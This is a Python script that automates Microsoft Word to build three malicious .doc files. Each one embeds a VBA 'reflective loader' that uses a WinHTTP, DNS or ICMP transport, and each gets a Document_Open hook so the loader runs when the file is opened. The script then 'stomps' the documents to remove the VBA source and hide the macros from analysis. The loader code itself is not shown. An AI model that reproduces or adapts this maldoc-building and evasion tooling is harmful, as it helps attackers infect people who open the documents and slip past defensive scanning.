"""Create .doc files with VBA macros for each reflective loader variant, then stomp them.

Usage: python create_docs.py

Creates three .doc files, one per transport variant, each with:
  - The standalone loader .bas code in a standard module
  - A Document_Open hook in ThisDocument
Then runs vba_stomp.py on each to strip the VBA source.
"""
import subprocess
import sys
import time
from pathlib import Path

try:
    import pythoncom
    import win32com.client
except ImportError:
    sys.stderr.write("[!] Required: pip install pywin32\n")
    sys.exit(1)

ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "src" / "scripts"
STOMP = ROOT / "src" / "tools" / "vba-stomp" / "vba_stomp.py"

VARIANTS = [
    {
        "name": "ReflectiveLoader_WinHTTP",
        "bas": "ReflectiveLoader_WinHTTP_Standalone.bas",
        "module_name": "RefLoader_WinHTTP",
        "doc_name": "loader_winhttp.doc",
    },
    {
        "name": "ReflectiveLoader_DNS",
        "bas": "ReflectiveLoader_DNS_Standalone.bas",
        "module_name": "RefLoader_DNS",
        "doc_name": "loader_dns.doc",
    },
    {
        "name": "ReflectiveLoader_ICMP",
        "bas": "ReflectiveLoader_ICMP_Standalone.bas",
        "module_name": "RefLoader_ICMP",
        "doc_name": "loader_icmp.doc",
    },
]


def com_call_with_retry(func, retries=5, delay=1.0):
    for i in range(retries):
        try:
            return func()
        except pythoncom.com_error as e:
            if e.args[0] == -2147418111 and i < retries - 1:  # RPC_E_CALL_REJECTED
                time.sleep(delay)
                continue
            raise


def create_doc(variant: dict, word_app) -> Path:
    script_dir = SCRIPTS / variant["name"]
    bas_path = script_dir / variant["bas"]
    doc_path = script_dir / variant["doc_name"]

    if doc_path.exists():
        doc_path.unlink()

    bas_code = bas_path.read_text(encoding="utf-8")

    lines = bas_code.splitlines(keepends=True)
    bas_code = "".join(l for l in lines if not l.strip().startswith("Attribute VB_Name"))

    doc = com_call_with_retry(lambda: word_app.Documents.Add())
    time.sleep(1)

    com_call_with_retry(lambda: doc.SaveAs2(str(doc_path), FileFormat=0))
    time.sleep(0.5)

    vb_proj = doc.VBProject
    mod = vb_proj.VBComponents.Add(1)  # vbext_ct_StdModule
    mod.Name = variant["module_name"]
    mod.CodeModule.AddFromString(bas_code)

    this_doc = vb_proj.VBComponents("ThisDocument")
    hook = f"Private Sub Document_Open()\n    {variant['module_name']}.Run\nEnd Sub"
    this_doc.CodeModule.AddFromString(hook)

    com_call_with_retry(lambda: doc.Save())
    time.sleep(0.5)
    com_call_with_retry(lambda: doc.Close(SaveChanges=0))

    print(f"  [+] Created {doc_path.name}")
    return doc_path


def stomp_doc(doc_path: Path) -> Path:
    stomped = doc_path.with_stem(doc_path.stem + "_stomped")
    result = subprocess.run(
        [sys.executable, str(STOMP), str(doc_path), "-o", str(stomped)],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        print(f"  [!] Stomp failed for {doc_path.name}")
        print(result.stdout)
        print(result.stderr)
        return doc_path

    print(f"  [+] Stomped -> {stomped.name}")
    return stomped


def main():
    print("[*] Starting Word...")
    word = win32com.client.DispatchEx("Word.Application")
    word.Visible = False
    word.DisplayAlerts = 0
    time.sleep(2)

    try:
        for v in VARIANTS:
            print(f"\n[*] {v['name']}")
            doc_path = create_doc(v, word)
            stomp_doc(doc_path)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            word.Quit()
        except Exception:
            pass
        print("\n[*] Done")


if __name__ == "__main__":
    main()
